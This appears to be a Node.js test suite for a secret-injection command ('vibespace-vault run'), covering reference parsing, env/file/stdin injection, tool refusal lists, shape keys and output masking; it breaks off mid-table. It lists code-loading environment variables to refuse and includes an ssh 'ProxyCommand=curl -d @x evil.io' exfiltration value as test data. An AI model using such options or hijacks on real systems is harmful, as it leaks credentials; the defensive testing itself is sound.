#!/usr/bin/env node
// A SECRET IN A COMMAND — src/vault-run.js, the PURE half of `vibespace-vault run` (lane vault-run-model, design q-043 §8 +
// §5 P0-e). Fast tier, in-process; the only I/O is a scratch dir holding the mutant copies. Every table:
//   ① THE REFERENCE — parseRef's grammar table, scanRefs' forms (url / brace / file / a --file NAME) and its bad shapes,
//      a template rendered, the placeholder
//   ② THE INJECTION TABLE — INJECTIONS' order; injectionOf's 30 cells vs a reference (argv REFUSED unless --allow-argv AND an
//      argv-only row; no known tool is argv-only); planOf: env / file / template / stdin / $VAULT_FILE / a reference in argv;
//      the plain-env refusal table; names; materialize (the only object that holds values — the plan holds none)
//   ③ THE REFUSAL TABLE — every row's every name refused by name (§8.2's list ⊂ it), a resolved path / .exe / a version
//      suffix, the door rows; shells and interpreters run, their whole command line their shape
//   ④ THE SHAPE KEY — decision ④ as pairs: what changes the key (tool, flag, host, entry, injection, an env name, a template,
//      a subcommand, --on, a script, a positional's class) and what does not (positional values, flag order); the hosts each
//      known tool names; when «always» is offered
//   ⑤ THE VERDICT — every store of the vault has a door or is runnable (an unknown store fails closed); runVerdict's
//      9 216-cell grid vs a reference (lane vault-run-door: + the design's «shape seen?» — a local instance asks a NEW shape)
//   ⑥ THE SCRUBBER — 7 values × 50 printings (Node's own encoders are the oracle; lane vault-scrub-forms: + UTF-16 LE/BE,
//      base32, quoted-printable, \xNN / octal / \u{…} escapes, HTML entities, colour escapes, wrapped base64 — each a real
//      producer's) masked whole; every split point and three chunkings equal the one-shot; text without a value passes byte
//      for byte; FORMS is the one list (spelled + read); ONE run masker sees a value split between stdout and stderr; the
//      sieve's NAMED holes and the floor pass (controls)
//   ⑥b THE REAL PRODUCERS' TABLE (q-043 verify M1) — every printing × a 21-character value × start / middle / end of a chunk
//      × the stream cut at EVERY point inside the printed value: masked whole, equal to the one-shot; the floor row
//   ⑦ THE CLI's WORDS — parseRunArgs
//   ⑧ MUTANTS — patched copies RED: the scrubber without base64; argv allowed by default; a print-class tool not refused;
//      a value split across chunks escaping; lane vault-scrub-forms: each NEW form dropped (utf16, base32, qp, escape, entity,
//      ansi, wrap), a view's held tail ignored, a backslash run held whole
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import zlib from 'node:zlib';
import { StringDecoder } from 'node:string_decoder';
import { createRequire } from 'node:module';
import { scratchDir } from './scratch.mjs';
const require = createRequire(import.meta.url);
const REPO = path.resolve(new URL('..', import.meta.url).pathname);
let pass = 0, fail = 0;
const ok = (c, n, e) => { if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; console.error('  ✗ ' + n + (e !== undefined ? '\n    ' + String(typeof e === 'string' ? e : JSON.stringify(e)).slice(0, 900) : '')); } };
const eq = (a, b) => JSON.stringify(a) === JSON.stringify(b);
const SRC = path.join(REPO, 'src/vault-run.js');
const V = require(SRC);
const VI = require(path.join(REPO, 'src/vault-inventory.js'));
const VB = require(path.join(REPO, 'src/vault-blocked.js'));
const M1 = 'vault://mounts/m1/secretKey', M2 = 'vault://mounts/m2/secretKey', ACCT = 'vault://accounts/acct_1/key';

console.log('① THE REFERENCE — vault://<store>/<row>/<field>');
{
  const R = [
    [M1, { id: 'mounts:m1#secretKey', label: 'mounts/m1/secretKey' }],
    ['vault://app-secrets/my.app/item.0.1700000000', { id: 'app-secrets:my.app#item.0.1700000000', label: 'app-secrets/my.app/item.0.1700000000' }],
    ['vault://secrets/host:abc/token', { id: 'secrets:host:abc#token', label: 'secrets/host:abc/token' }],
    ['vault://mounts/a%2Fb/config.pass', { id: 'mounts:a/b#config.pass', label: 'mounts/a%2Fb/config.pass' }],   // a '/' in a row is encoded
    ['vault://mounts/%6D1/secretKey', { id: 'mounts:m1#secretKey', label: 'mounts/m1/secretKey' }],             // the label is canonical
    ['vault://mounts/r%C3%A9/k', { id: 'mounts:ré#k', label: 'mounts/r%C3%A9/k' }],
    ['vault://accounts/acct_1/key', { id: 'accounts:acct_1#key', label: 'accounts/acct_1/key' }],
    ['vault://nope/m1/key', null], ['vault://mounts/m1', null], ['vault://mounts//key', null], ['vault://mounts/m1/', null],
    ['vault://mounts/m%ZZ/key', null], ['vault://mounts/a%23b/key', null], ['vault://mounts/a%20b/key', null], ['VAULT://mounts/m1/key', null],
    ['vault:/mounts/m1/key', null], [' vault://mounts/m1/key', null], ['vault://mounts/m1/key x', null], ['vault://Mounts/m1/key', null],
    ['vault://mounts/m1/k y', null], [`vault://mounts/${'a'.repeat(241)}/key`, null], ['', null], [null, null], [42, null],
  ];
  const bad = R.filter(([s, want]) => { const r = V.parseRef(s); return want ? !(r && r.id === want.id && r.label === want.label && r.ref === 'vault://' + want.label) : r !== null; });
  ok(!bad.length, `parseRef: ${R.length} rows — the inventory's <store>:<entry>#<field>, the row percent-decoded, a canonical label; a store the vault does not have, a missing part, a bad escape, a '#' / whitespace in a row, the wrong case or a stray character ⇒ null`, bad.map(([s]) => [s, V.parseRef(s)]));
  ok(R.filter(([, w]) => w).every(([s]) => VI.parseRef(V.parseRef(s).id) !== null), 'every id parses back through src/vault-inventory.js (ONE grammar)');
  const sc = V.scanRefs(`curl -K $VAULT_FILE{hdr} -d @$VAULT_FILE{mounts/m2/secretKey} --x=${M1} '$VAULT{mounts/m1/secretKey}'`);
  ok(eq(sc.refs.map((r) => [r.form, r.name || r.ref]), [['file', 'hdr'], ['file', M2], ['url', M1], ['brace', M1]]) && !sc.bad.length, 'scanRefs: $VAULT_FILE{NAME}, $VAULT_FILE{ref}, vault://… inside a word, $VAULT{…} — each with its form', sc);
  const B = ['$VAULT{mounts/m1}', '$VAULT_FILE{1abc}', '$vault{mounts/m1/secretKey}', '$VAULT{mounts/m1/secretKey', 'Vault://mounts/m1/key', 'vault://nope/a/b', '$Vault_File{x}', '$VAULT{hdr}'];
  const missed = B.filter((s) => { const r = V.scanRefs(`a ${s} b`); return r.bad.length !== 1 || r.refs.length; });
  ok(!missed.length, `scanRefs: ${B.length} reference-shaped pieces that do not parse are BAD (never read as plain text): a short path, a bad name, the wrong case, no closing brace, an unknown store, a bare NAME in $VAULT{}`, missed);
  ok(!V.scanRefs('echo $VAULT_ADDR ${VAULT} vault-cli vault:x https://vault.example.com').refs.length && !V.scanRefs('echo $VAULT_ADDR ${VAULT} vault-cli https://vault.example.com').bad.length, 'text that only resembles a reference ($VAULT_ADDR, ${VAULT}, a vault host) is neither a reference nor bad');
  const tpl = `[default]\nheader = "Authorization: Bearer $VAULT{mounts/m1/secretKey}"\nuser = me:$VAULT{mounts/m2/secretKey}\n`;
  ok(V.renderTemplate(tpl, (r) => (r === M1 ? 'ONE' : r === M2 ? 'TWO' : '?')) === '[default]\nheader = "Authorization: Bearer ONE"\nuser = me:TWO\n', 'renderTemplate: every $VAULT{…} becomes its value, nothing else moves (op inject)');
  ok(V.placeholderOf(V.parseRef(M1)) === '[vault:mounts/m1/secretKey]' && V.placeholderOf(V.parseRef('vault://mounts/a%2Fb/k')) === '[vault:mounts/a%2Fb/k]', 'the placeholder is [vault:<store>/<row>/<field>] (the canonical label)');
}

console.log('② THE INJECTION TABLE — env → 0600 file → stdin; argv refused by default');
{
  ok(eq(V.INJECTIONS.map((r) => [r.where, r.open]), [['env', true], ['file', true], ['stdin', true], ['argv', false]]), 'INJECTIONS: env (the default) → file → stdin → argv (closed) — the order is the preference');
  const cells = [];
  for (const where of ['env', 'file', 'stdin', 'argv', 'pty']) for (const allowArgv of [false, true]) for (const row of [null, { argvOnly: false }, { argvOnly: true }]) {
    const want = where === 'pty' ? 'bad_flag' : where !== 'argv' ? 'ok:false' : allowArgv && row && row.argvOnly ? 'ok:true' : 'argv_refused';
    const v = V.injectionOf(where, { allowArgv, row }), got = v.ok ? `ok:${v.argvExposed}` : v.code;
    if (got !== want) cells.push({ where, allowArgv, row, got, want });
  }
  ok(!cells.length, 'injectionOf: 30 cells vs the reference — argv opens ONLY with --allow-argv AND a known argv-only tool (argvExposed), never by default', cells);
  ok(V.KNOWN_TOOLS.every((r) => r.argvOnly === false), `no known tool is argv-only today (${V.KNOWN_TOOLS.length} rows) — every one of them takes a secret from env / a file / stdin`);
  const argvAll = V.KNOWN_TOOLS.filter((r) => { const p = V.planOf({ argv: [r.name, `--token=${M1}`], allowArgv: true }); return p.ok || p.code !== 'argv_refused'; });
  ok(!argvAll.length, 'so --allow-argv still refuses a reference in argv for every known tool (argv_refused)', argvAll.map((r) => r.name));
  const P = (req) => V.planOf({ argv: ['curl', 'https://api.example.com/x'], ...req });
  const a = P({ env: [['TOKEN', M1]] });
  ok(a.ok && eq(a.env, [{ name: 'TOKEN', ref: M1 }]) && eq(a.injection, ['env:TOKEN']) && a.refs.length === 1 && !a.argvExposed && a.timeoutSec === 120, 'env: --env NAME=vault://… ⇒ the child\'s env, the default timeout 120 s', a);
  const b = P({ file: { NETRC_FILE: M1 }, stdin: M2 });
  ok(b.ok && eq(b.files.map((f) => [f.slot, f.name, f.ref]), [[0, 'NETRC_FILE', M1]]) && b.stdin === M2 && eq(b.injection, ['file:NETRC_FILE', 'stdin']), 'file + stdin: --file NAME=vault://… ⇒ a 0600 file whose path is NAME; --stdin vault://… ⇒ stdin', b);
  const c = V.planOf({ argv: ['curl', '-K', '$VAULT_FILE{hdr}', '-E', '$VAULT_FILE{mounts/m2/secretKey}', 'https://api.example.com'], file: [['hdr', '@hdr.tpl']], templates: { 'hdr.tpl': 'header = "X-Key: $VAULT{mounts/m1/secretKey}"' } });
  ok(c.ok && eq(c.files.map((f) => [f.slot, f.name, f.ref, f.template]), [[0, 'hdr', null, 'hdr.tpl'], [1, null, M2, null]]) && eq(c.refs.map((r) => r.ref).sort(), [M1, M2]) && eq(c.injection, ['file:hdr', 'file:$VAULT_FILE']), 'a template (--file NAME=@path, its $VAULT{…} the entries) and $VAULT_FILE{NAME} / $VAULT_FILE{ref} in argv — paths, never values', c);
  const R = [
    [{ argv: ['curl', `-H`, `Authorization: Bearer ${M1}`] }, 'argv_refused'],
    [{ argv: ['curl', `-u`, `me:$VAULT{mounts/m1/secretKey}`] }, 'argv_refused'],
    [{ argv: ['curl', `--token=${M1}`], allowArgv: true }, 'argv_refused'],
    [{ argv: ['curl', '-K', '$VAULT_FILE{hdr}'] }, 'bad_reference'],
    [{ argv: ['curl', 'https://x.example'] }, 'no_reference'],
    [{ argv: [] }, 'no_command'], [{ argv: [''] }, 'no_command'],
    [{ argv: ['curl', 'x'.repeat(4097)], env: [['T', M1]] }, 'cmd_too_long'],
    [{ argv: ['curl', 'https://x.example'], env: [['T', `Bearer ${M1}`]] }, 'bad_reference'],
    [{ argv: ['curl', 'https://x.example'], env: [['T', 'vault://nope/a/b']] }, 'bad_reference'],
    [{ argv: ['curl', 'https://x.example'], env: [['1T', M1]] }, 'bad_env_name'],
    [{ argv: ['curl', 'https://x.example'], env: [['T', M1]], file: [['T', M2]] }, 'duplicate_name'],
    [{ argv: ['curl', 'https://x.example'], file: [['T', '@t']] }, 'template_unread'],
    [{ argv: ['curl', 'https://x.example'], file: [['T', '@t']], templates: { t: `k = $VAULT{mounts/m1/secretKey}\n${'#'.repeat(65536)}` } }, 'template_too_long'],
    [{ argv: ['curl', 'https://x.example'], file: [['T', '@t']], templates: { t: 'url = vault://mounts/m1/secretKey' } }, 'bad_reference'],
    [{ argv: ['curl', 'https://x.example'], file: [['T', '@t']], templates: { t: 'k = $VAULT_FILE{mounts/m1/secretKey}' } }, 'bad_reference'],
    [{ argv: ['curl', 'https://x.example'], file: [['T', 'not-a-ref']] }, 'bad_reference'],
    [{ argv: ['curl', 'https://x.example'], stdin: 'hunter2-plain' }, 'bad_reference'],
  ];
  const wrong = R.filter(([req, code]) => { const p = V.planOf(req); return p.ok || p.code !== code || !p.words; });
  ok(!wrong.length, `planOf refusals: ${R.length} rows — a reference in argv (even with --allow-argv for curl), an undeclared $VAULT_FILE{NAME}, nothing to inject, no command, too long, a partial / unknown reference in an env value, a bad / doubled name, an unread / over-long template, a raw vault:// or a $VAULT_FILE in a template, a plain value where a reference goes — each by name with its words`, wrong.map(([req, code]) => [code, V.planOf(req)]));
  const HIJACK = ['LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES', 'NODE_OPTIONS', 'PYTHONPATH', 'PYTHONSTARTUP', 'PERL5OPT', 'RUBYOPT', 'JAVA_TOOL_OPTIONS', 'BASH_ENV', 'ENV', 'PROMPT_COMMAND', 'GIT_SSH_COMMAND', 'GIT_CONFIG_PARAMETERS', 'GIT_CONFIG_GLOBAL', 'GIT_ASKPASS', 'PAGER', 'EDITOR', 'RSYNC_RSH', 'PATH'];
  const CONFIG = ['KUBECONFIG', 'kubeconfig', 'CURL_HOME', 'WGETRC', 'DOCKER_CONFIG', 'AWS_CONFIG_FILE', 'NETRC', 'npm_config_userconfig', 'HTTPS_PROXY', 'https_proxy', 'ALL_PROXY', 'no_proxy', 'HOME', 'XDG_CONFIG_HOME'];   // lane vault-run-door (the review): + a home / an npm config in any case
  const PLAIN = ['GH_TOKEN', 'PGPASSWORD', 'AWS_SECRET_ACCESS_KEY', 'PGHOST', 'LANG', 'TZ', 'MY_SETTING'];
  const asCell = (n, as) => { const req = as === 'plain' ? { env: [[n, 'x'], ['T', M1]] } : as === 'env' ? { env: [[n, M1]] } : { file: [[n, M1]] }; const p = V.planOf({ argv: ['curl', 'https://x.example'], ...req }); return p.ok ? 'ok' : p.code; };
  const envBad = [];
  for (const n of HIJACK) for (const as of ['plain', 'env', 'file']) if (asCell(n, as) !== 'env_refused') envBad.push([n, as, asCell(n, as)]);
  for (const n of CONFIG) for (const as of ['plain', 'env', 'file']) { const want = as === 'file' ? 'ok' : 'env_refused'; if (asCell(n, as) !== want) envBad.push([n, as, asCell(n, as)]); }
  for (const n of PLAIN) for (const as of ['plain', 'env', 'file']) if (asCell(n, as) !== 'ok') envBad.push([n, as, asCell(n, as)]);
  ok(!envBad.length, `the env table: ${HIJACK.length} names that load / run / start something refused as plain, as a value and as a file; ${CONFIG.length} config / proxy names refused as a plain value (a --file the hub renders is fine); ${PLAIN.length} ordinary names pass`, envBad);
  ok(V.planOf({ argv: ['curl', 'https://x.example'], env: [['LD_PRELOAD', './x.so'], ['T', M1]] }).why === V.envRefusedOf('LD_PRELOAD'), 'an env refusal names why');
  // materialize — the ONE object that holds values
  const VAL = { [M1]: 'value-one-planted-1', [M2]: 'value-two-planted-2', 'vault://mounts/m3/secretKey': 'value-three-planted-3' };
  const p = V.planOf({ argv: ['curl', '-K', '$VAULT_FILE{hdr}', '--cert=$VAULT_FILE{mounts/m2/secretKey}', 'https://api.example.com'], env: [['TOKEN', M1], ['MODE', 'fast']], file: [['hdr', '@h.tpl'], ['KEYF', 'vault://mounts/m3/secretKey']], stdin: M2, templates: { 'h.tpl': 'header = "X: $VAULT{mounts/m1/secretKey}"' } });
  const mt = V.materialize(p, { valueOf: (r) => VAL[r], pathOf: (s) => `/run/vs/f${s}` });
  ok(p.ok && eq(mt.argv, ['curl', '-K', '/run/vs/f0', '--cert=/run/vs/f2', 'https://api.example.com']) && eq(mt.env, { MODE: 'fast', TOKEN: VAL[M1], hdr: '/run/vs/f0', KEYF: '/run/vs/f1' }) && eq(mt.files.map((f) => [f.slot, f.path, f.content]), [[0, '/run/vs/f0', `header = "X: ${VAL[M1]}"`], [1, '/run/vs/f1', VAL['vault://mounts/m3/secretKey']], [2, '/run/vs/f2', VAL[M2]]]) && mt.stdin === VAL[M2] + '\n', 'materialize: argv carries PATHS, env the values + NAME=path per --file, each file its value or its rendered template, stdin the value + a newline', mt);
  ok(!Object.values(VAL).some((v) => JSON.stringify(p).includes(v)) && !Object.values(VAL).some((v) => mt.argv.join(' ').includes(v)), 'the plan holds NO value (only references) and no value ever reaches argv');
}

console.log('③ THE REFUSAL TABLE — print / transform / pack / copy / trace / wrap, refused by name');
{
  const DESIGN = 'echo printf cat tee head tail less more env printenv export set declare xxd od hexdump base64 base32 strings rev tr cut fold paste sed awk gzip bzip2 xz zstd zip tar 7z openssl gpg'.split(' ');
  const names = V.TOOL_ROWS.flatMap((r) => r.names);
  ok(DESIGN.every((n) => names.includes(n)), `§8.2's list (${DESIGN.length} tools) ⊂ the table (${names.length} names)`, DESIGN.filter((n) => !names.includes(n)));
  const missed = [];
  for (const r of V.TOOL_ROWS) for (const n of r.names) { const p = V.planOf({ argv: [n, '$VAULT_FILE{mounts/m1/secretKey}'], env: [['T', M1]] }); if (p.ok || p.code !== r.code || p.cls !== r.cls) missed.push([n, p.code]); }
  ok(!missed.length, `every name of every row (${names.length}) is refused with its row's code — tool_prints_secrets (print · transform · pack · copy · trace) · tool_wraps_another · tool_has_its_own_door`, missed);
  const R = [
    [{ argv: ['mytool'], resolved: '/usr/bin/cat' }, 'tool_prints_secrets'], [{ argv: ['/bin/CAT.EXE'] }, 'tool_prints_secrets'], [{ argv: ['C:\\tools\\base64.exe'] }, 'tool_prints_secrets'],
    [{ argv: ['gpg2'] }, 'tool_prints_secrets'], [{ argv: ['vibespace-exit', 'run'] }, 'tool_has_its_own_door'], [{ argv: ['/home/u/.local/bin/vibespace-browser'] }, 'tool_has_its_own_door'],
    [{ argv: ['agent-browser'] }, 'tool_has_its_own_door'], [{ argv: ['sudo', 'curl'] }, 'tool_wraps_another'], [{ argv: ['xargs', 'curl'] }, 'tool_wraps_another'], [{ argv: ['timeout', '5', 'curl'] }, 'tool_wraps_another'],
    // lane vault-run-door: the TYPED name is refused too — `vi` resolves to /usr/bin/vim.basic, `cat` to a multi-call binary
    [{ argv: ['vi'], resolved: '/usr/bin/vim.basic' }, 'tool_prints_secrets'], [{ argv: ['cat'], resolved: '/usr/lib/multi/coreutils' }, 'tool_prints_secrets'], [{ argv: ['base64'], resolved: '/opt/x/b64tool' }, 'tool_prints_secrets'],
  ];
  const wrong = R.filter(([req, code]) => { const p = V.planOf({ ...req, env: [['T', M1]] }); return p.code !== code; });
  ok(!wrong.length, 'the tool is argv[0] RESOLVED (the door\'s PATH lookup wins over the typed name), any directory, any case, .exe, a version suffix; VibeSpace\'s CLIs and the agent browser have their own doors; a wrapper is refused', wrong.map(([req, c]) => [req.argv[0], c, V.planOf({ ...req, env: [['T', M1]] }).code]));
  const RUN = [['bash', 'shell'], ['sh', 'shell'], ['zsh', 'shell'], ['/usr/bin/pwsh', 'shell'], ['cmd', 'shell'], ['python3.12', 'interpreter'], ['node', 'interpreter'], ['perl', 'interpreter'], ['curl', 'tool'], ['gh', 'tool'], ['terraform', 'tool'], ['./deploy.sh', 'tool']];
  const off = RUN.filter(([t, kind]) => { const p = V.planOf({ argv: [t, '-c', 'x'], env: [['T', M1]] }); return !p.ok || p.kind !== kind; });
  ok(!off.length, 'shells and interpreters are NOT refused (kind shell / interpreter); ordinary tools are tools', off);
}

console.log('④ THE SHAPE KEY — tool + flags + hosts + entries (decision ④); positionals vary');
{
  const K = (req) => { const p = V.planOf(req); if (!p.ok) throw new Error(JSON.stringify(p)); return V.shapeKeyOf(V.shapeOf(p)); };
  const base = { argv: ['curl', '-sS', '-H', '@a.json', 'https://api.example.com/v1/items', '7'], env: [['TOKEN', M1]] };
  const with_ = (o) => ({ ...base, ...o });
  const SAME = [
    ['another file name', with_({ argv: ['curl', '-sS', '-H', '@b.json', 'https://api.example.com/v1/items', '7'] })],
    ['another URL path on the same host', with_({ argv: ['curl', '-sS', '-H', '@a.json', 'https://api.example.com/v2/other?q=1', '7'] })],
    ['another number', with_({ argv: ['curl', '-sS', '-H', '@a.json', 'https://api.example.com/v1/items', '42'] })],
    ['flags in another order', with_({ argv: ['curl', '-H', '@a.json', '-sS', 'https://api.example.com/v1/items', '7'] })],
    ['the same plan again', with_({})],
  ];
  const DIFF = [
    ['a flag added', with_({ argv: ['curl', '-sS', '-v', '-H', '@a.json', 'https://api.example.com/v1/items', '7'] })],
    ['another host', with_({ argv: ['curl', '-sS', '-H', '@a.json', 'https://evil.example.net/v1/items', '7'] })],
    ['another port', with_({ argv: ['curl', '-sS', '-H', '@a.json', 'https://api.example.com:8443/v1/items', '7'] })],
    ['another entry', with_({ env: [['TOKEN', M2]] })],
    ['a second entry', with_({ env: [['TOKEN', M1], ['T2', M2]] })],
    ['another injection (file, not env)', with_({ env: [], file: [['TOKEN', M1]] })],
    ['another env NAME for the entry', with_({ env: [['TOKEN2', M1]] })],
    ['a plain env name added', with_({ env: [['TOKEN', M1], ['VERBOSE', '1']] })],
    ['a positional of another class (a path, not a word)', with_({ argv: ['curl', '-sS', '-H', './a.json', 'https://api.example.com/v1/items', '7'] })],
    ['--on another machine', with_({ on: 'mac-mini' })],
    ['another resolved tool', with_({ resolved: '/opt/tools/curl' })],
  ];
  const k0 = K(base);
  ok(SAME.every(([, r]) => K(r) === k0), `the SAME shape (${SAME.length}): ${SAME.map(([n]) => n).join(' · ')}`, SAME.filter(([, r]) => K(r) !== k0).map(([n]) => n));
  ok(DIFF.every(([, r]) => K(r) !== k0) && new Set(DIFF.map(([, r]) => K(r))).size === DIFF.length, `a NEW shape (${DIFF.length}, each its own): ${DIFF.map(([n]) => n).join(' · ')}`, DIFF.filter(([, r]) => K(r) === k0).map(([n]) => n));
  const g = (argv) => K({ argv, env: [['GH_TOKEN', M1]] });
  ok(g(['gh', 'pr', 'list', '-R', 'a/b']) === g(['gh', 'pr', 'list', '-R', 'c/d']) && g(['gh', 'pr', 'list']) !== g(['gh', 'repo', 'delete']) && g(['gh', 'pr', 'list']) !== g(['gh', 'pr', 'merge']), 'a known tool\'s subcommand words belong to the tool (gh pr list ≠ gh repo delete ≠ gh pr merge); a flag\'s value is a positional (-R a/b ≡ -R c/d)');
  const kc = (n) => K({ argv: ['kubectl', '-n', n, 'get', 'pods'], file: [['KUBECONFIG', '@kc']], templates: { kc: 'server: https://k8s.example:6443\ntoken: $VAULT{mounts/m1/secretKey}\n' } });
  ok(kc('prod') === kc('dev') && V.shapeOf(V.planOf({ argv: ['kubectl', '-n', 'prod', 'get', 'pods'], env: [['T', M1]] })).sub.join() === 'get', 'a value flag\'s value is never read as the subcommand (kubectl -n prod get ⇒ sub get)');
  const tp = (t) => K({ argv: ['curl', '-K', '$VAULT_FILE{c}', 'https://api.example.com'], file: [['c', '@c']], templates: { c: t } });
  ok(tp('header = "X: $VAULT{mounts/m1/secretKey}"') !== tp('header = "X: $VAULT{mounts/m1/secretKey}"\noutput = ./leak'), 'a template\'s text is part of the shape (a changed template is a new shape — the card shows it)');
  const sh = (s) => K({ argv: ['bash', '-c', s], env: [['T', M1]] });
  ok(sh('curl -H "X: $T" https://api.example.com/a') !== sh('curl -H "X: $T" https://api.example.com/b'), 'a shell\'s whole script IS the shape (one character changes it)');
  ok(k0.startsWith(`${V.SHAPE_V}:`) && V.SHAPE_NOTE.includes('positional arguments may change'), 'the key is versioned (vr1:) and the card\'s note says positionals may change');
  // THE HOSTS
  const H = (argv, extra = {}) => { const p = V.planOf({ argv, env: [['T', M1]], ...extra }); if (!p.ok) throw new Error(JSON.stringify(p)); return V.shapeOf(p).hosts.join(' '); };
  const HOSTS = [
    [['curl', 'https://API.example.com/x'], 'api.example.com'], [['curl', 'https://h.example:8443/x', 'http://u:p@other.example/'], 'h.example:8443 other.example'],
    [['git', 'clone', 'git@github.com:org/repo.git'], 'github.com'], [['git', 'push', 'https://gitlab.example.com/x.git'], 'gitlab.example.com'],
    [['ssh', '-i', '$VAULT_FILE{mounts/m2/secretKey}', '-p', '2222', 'deploy@host.example', 'uptime'], 'host.example'],
    [['scp', '-i', '$VAULT_FILE{mounts/m2/secretKey}', 'f.txt', 'u@h.example:/tmp/'], 'h.example'],
    [['psql', '-h', 'db.internal', '-U', 'me'], 'db.internal'], [['psql', '--host=db2.internal'], 'db2.internal'], [['psql', 'postgresql://u@db3.internal:5432/x'], 'db3.internal:5432'],
    [['docker', 'login', 'ghcr.io', '-u', 'me', '--password-stdin'], 'ghcr.io'], [['docker', 'push', 'ubuntu:22.04'], 'registry-1.docker.io'],
    [['gh', 'api', '/user'], 'api.github.com github.com'], [['aws', 's3', 'ls'], '*.amazonaws.com'], [['aws', 's3', 'ls', '--endpoint-url', 'https://minio.local:9000'], 'minio.local:9000'],
    [['bash', '-c', 'curl https://x.example/a'], 'x.example'], [['curl', '-K', '$VAULT_FILE{mounts/m2/secretKey}'], ''], [['terraform', 'apply'], ''],
  ];
  const hb = HOSTS.filter(([argv, want]) => H(argv) !== want);
  ok(!hb.length, `the hosts (${HOSTS.length} rows): any URL (port kept, user stripped, lower case), scp-like targets, the ssh target (never a value flag's value), psql's host flag / URL, docker's registry (else its default), gh / aws defaults only when nothing names a host, a shell's URLs; none for a tool that names none`, hb.map(([a, w]) => [a.join(' '), w, H(a)]));
  ok(H(['gh', 'api', '/user'], { env: [['T', M1], ['GH_HOST', 'ghe.corp.example']] }) === 'ghe.corp.example' && H(['kubectl', 'get', 'pods'], { env: [], file: [['KUBECONFIG', '@kc']], templates: { kc: 'clusters:\n- cluster:\n    server: https://k8s.example:6443\nusers:\n- user:\n    token: $VAULT{mounts/m1/secretKey}\n' } }) === 'k8s.example:6443', 'a host from the plain env a known tool reads (GH_HOST) and from a template the hub renders (a kubeconfig\'s server)');
  ok(!H(['curl', 'https://api.example.com'], { env: [['T', M1], ['U', M2.replace('vault', 'vault')]] }).includes('mounts'), 'a vault:// reference is never read as a host');
  const A = (argv) => { const s = V.shapeOf(V.planOf({ argv, env: [['T', M1]] })); return `${s.always}:${s.noAlways}`; };
  const ALW = [[['curl', 'https://api.example.com'], 'true:null'], [['gh', 'api', '/user'], 'true:null'], [['curl', '-K', '$VAULT_FILE{mounts/m2/secretKey}'], 'false:unknown-destination'], [['terraform', 'apply'], 'false:unknown-destination'], [['./deploy.sh', 'https://x.example'], 'false:unknown-destination'], [['bash', '-c', 'curl https://x.example'], 'false:shell'], [['python3', 'sdk.py'], 'false:interpreter']];
  const aw = ALW.filter(([a, w]) => A(a) !== w);
  ok(!aw.length, '«always» is offered only for a KNOWN tool that names its host — never a tool outside the table, one naming no host, a shell or an interpreter (destination unknown / the script is the program)', aw.map(([a, w]) => [a.join(' '), w, A(a)]));
  const pr = V.shapeOf(V.planOf({ argv: ['curl', 'https://api.example.com'], env: [['T', M1]] }));
  ok(pr.proxyEnv === true && V.shapeOf(V.planOf({ argv: ['psql', '-h', 'db.x'], env: [['PGPASSWORD', M1]] })).proxyEnv === false, 'the shape says whether the tool honours the proxy env (P1 vault-run-egress fences on it)');
}

console.log('①b AN AGENT\'S OWN ENTRY (lane vault-run-door × lane vault-mint-put) — vault://agent:<scope>/<name>');
{
  const a = V.parseRef('vault://agent:conv-1/github-token'), b = V.parseRef('vault://secrets/agent:conv-1%2Fgithub-token/secret');
  ok(a && b && a.id === 'secrets:agent:conv-1/github-token#secret' && a.id === b.id && a.ref === 'vault://agent:conv-1/github-token' && b.ref === a.ref && V.placeholderOf(a) === '[vault:agent:conv-1/github-token]', 'the reference vibespace-vault mint / put hand out (vault://agent:<scope>/<name>) and the long spelling are ONE entry (the secrets store, field secret) — its short spelling is its label', [a, b]);
  const sc = V.scanRefs('--x vault://agent:c-2/tok, $VAULT{agent:c-2/tok} $VAULT_FILE{agent:c-2/tok} vault://agent:c-2/');
  ok(sc.refs.length === 3 && sc.refs.every((r) => r.id === 'secrets:agent:c-2/tok#secret') && sc.refs.map((r) => r.form).join() === 'url,brace,file' && sc.bad.length === 1, 'scanRefs finds it as a url, inside $VAULT{…} and $VAULT_FILE{…}; a cut one is BAD', sc);
  ok(['vault://agent:c/a/b', 'vault://agent:/x', 'vault://agent:c/x:y', 'vault://agent:c/' + 'x'.repeat(65)].every((r) => V.parseRef(r) === null), 'a name with a slash or a colon, no scope, a name over 64 — refused (the mint lane\'s own grammar)');
  ok(V.ownDoorOf(a) === null && typeof V.ownDoorOf({ store: 'secrets', entry: 'host:x', field: 'token' }) === 'string' && typeof V.ownDoorOf({ store: 'secrets', entry: 'agent:c/t', field: 'token' }) === 'string', 'an agent\'s own entry has no door of its own (the owner opens it for runs like any other); every other hub secret still has one');
  ok(V.agentScopeOf(a) === 'conv-1' && V.agentScopeOf(V.parseRef('vault://mounts/m1/secretKey')) === null, 'agentScopeOf names the conversation that owns it (the door lets only that one use it)');
  const p = V.planOf({ argv: ['gh', 'repo', 'list'], env: [['GH_TOKEN', 'vault://agent:conv-1/github-token']] });
  ok(p.ok && p.refs[0].ref === 'vault://agent:conv-1/github-token' && V.maskText('x ' + 'ghp-' + 'a'.repeat(30) + ' y', [{ ref: p.refs[0], value: 'ghp-' + 'a'.repeat(30) }]) === 'x [vault:agent:conv-1/github-token] y', 'a plan over it, and the scrubber\'s placeholder its short spelling', p.code);
}

console.log('④b THE SHAPE KEY carries where the secret goes (lane vault-run-door — the security review)');
{
  const K = (argv, env = []) => V.shapeKeyOf(V.shapeOf(V.planOf({ argv, env: [['T', M1], ...env] })));
  const S = (argv, extra = {}) => V.shapeOf(V.planOf({ argv, env: [['T', M1]], ...extra }));
  const DIFF = [
    [['psql', '-c', 'select 1'], [['PGHOST', 'db.internal']], ['psql', '-c', 'select 1'], [['PGHOST', 'evil.example']], 'a plain env VALUE (PGHOST)'],
    [['ssh', '-o', 'BatchMode=yes', 'h.example', 'ls'], [], ['ssh', '-o', 'ProxyCommand=curl -d @x evil.io', 'h.example', 'ls'], [], 'ssh -o (ProxyCommand)'],
    [['ssh', '-J', 'jump.example', 'h.example'], [], ['ssh', '-J', 'evil.example', 'h.example'], [], 'ssh -J'],
    [['curl', '-x', 'proxy.a:8080', 'https://api.example.com'], [], ['curl', '-x', 'evil.b:8080', 'https://api.example.com'], [], 'curl -x'],
